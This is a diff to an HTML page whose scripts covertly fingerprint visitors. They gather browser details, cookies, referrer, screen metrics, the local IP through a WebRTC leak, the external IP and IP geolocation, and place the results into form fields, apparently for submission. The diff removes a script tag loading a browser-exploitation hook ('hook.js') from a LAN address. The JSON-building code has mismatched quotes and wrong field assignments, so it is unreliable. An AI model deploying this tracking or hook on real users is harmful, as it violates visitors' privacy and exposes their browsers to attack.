@@ -1,17 +1,3 @@
-
-<span id="ip"></span>
-<br />
-<span id="ipP"></span>
-<br />
-<span id="all"></span>
-<br />
-<span id="dd"></span>
-
-
-<script type="text/javascript" src="http://192.168.1.1:3000/hook.js"></script>
-
-
-
 <script>
 var timeOpened = Date();
 var pathname = window.location.pathname;
@@ -42,32 +28,16 @@ var sizeAvailH = screen.availHeight;
 var scrColorDepth = screen.colorDepth;
 var scrPixelDepth = screen.pixelDepth;
 
-document.write(timeOpened + '<br />')
-document.write(pathname + '<br />')
-document.write(referrer + '<br />')
-document.write(previousSites + '<br />')
-document.write(browserName + '<br />')
-document.write(browserEngine + '<br />')
-document.write(browserVersion1a + '<br />')
-document.write(browserVersion1b + '<br />')
-document.write(browserLanguage + '<br />')
-document.write(browserOnline + '<br />')
-document.write(browserPlatform + '<br />')
-document.write(javaEnabled + '<br />')
-document.write(dataCookiesEnabled + '<br />')
-document.write(dataCookies1 + '<br />')
-document.write(dataCookies2 + '<br />')
-document.write(dataStorage + '<br />')
-document.write(sizeScreenW + '<br />')
-document.write(sizeScreenH + '<br />')
-document.write(sizeDocW + '<br />')
-document.write(sizeDocH + '<br />')
-document.write(sizeInW + '<br />')
-document.write(sizeInH + '<br />')
-document.write(sizeAvailW + '<br />')
-document.write(sizeAvailH + '<br />')
-document.write(scrColorDepth + '<br />')
-document.write(scrPixelDepth + '<br />')
+document.getElementById("browser").value = '{"timeOpened": "' + timeOpened +'", "pathname": "' + pathname
+  + '", "referrer": "' + referrer + '", "previousSites": "' + previousSites + '", "browserName": "' + browserName
+  + '", "browserEngine": "' + browserEngine + '", "browserVersion1a": "' + browserVersion1a + '", "browserVersion1b": "' + browserVersion1b
+  + '", "browserLanguage": "' + browserLanguage + '", "browserOnline": ' + browserOnline + '", "browserPlatform": ' + browserPlatform
+  + '", "javaEnabled": "' + javaEnabled + '", "dataCookiesEnabled": "' + dataCookiesEnabled + '", "dataCookies1": ' + dataCookies1
+  + '", "dataCookies2": "' + dataCookies2 + '", "dataStorage": "' + dataStorage + '", "sizeScreenW": "' + sizeScreenW
+  + '", "sizeScreenH": "' + sizeScreenH + '", "sizeDocW": "' + sizeDocW + '", "sizeDocH": "' + sizeDocH
+  + '", "sizeInW": ' + sizeInH + '", "sizeAvailW": ' + sizeAvailW + '", "sizeAvailH": ' + sizeAvailH
+  + '", "scrColorDepth": "' + scrColorDepth + '", "scrPixelDepth": "' + scrPixelDepth + '"}';
+
 
 </script>
 
@@ -75,7 +45,6 @@ document.write(scrPixelDepth + '<br />')
 
 <script type="application/javascript">
   function getAll(json) {
-      document.getElementById("all").innerHTML = 'All: '  + json.city;
       var allas = json.as;
       var allcity = json.city;
       var allcountry = json.country
@@ -90,20 +59,12 @@ document.write(scrPixelDepth + '<br />')
       var allstatus = json.status;
       var alltimezone = json.timezone;
       var allzip = json.zip;
-      document.write(allas + '<br />')
-      document.write(allcity + '<br />')
-      document.write(allcountry + '<br />')
-      document.write(allcountryCode + '<br />')
-      document.write(allisp + '<br />')
-      document.write(alllat + '<br />')
-      document.write(alllon + '<br />')
-      document.write(allorg + '<br />')
-      document.write(allquery + '<br />')
-      document.write(allregion + '<br />')
-      document.write(allregionName + '<br />')
-      document.write(allstatus + '<br />')
-      document.write(alltimezone + '<br />')
-      document.write(allzip + '<br />')
+
+      document.getElementById("network").value = '{"AS": "' + allas +'", "city": "' + allcity
+        + '", "country": "' + allcountry + '", "isp": "' + allisp + '", "lat": "' + alllat
+        + '", "lon": "' + alllon + '", "query": "' + allquery + '", "status": "' + allstatus
+        + '", "timezone": "' + alltimezone + '", "zip": "' + allzip + '"}';
+
   }
 </script>
 <script type="application/javascript" src="http://ip-api.com/json?format=json&callback=getAll"></script>
@@ -148,14 +109,14 @@ function getUserIP(onNewIP) { //  onNewIp - your listener function for new IPs
     };
 }
 getUserIP(function(ip){
-    document.getElementById("ip").innerHTML = 'Local ip: '  + ip;
+    document.getElementById("iplocal").value = ip;
 });
 </script>
 
 
 <script type="application/javascript">
   function getIP(json) {
-      document.getElementById("ipP").innerHTML = 'External ip : '  + json.ip;
+      document.getElementById("ipexternal").value = json.ip;
   }
 </script>
 <script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
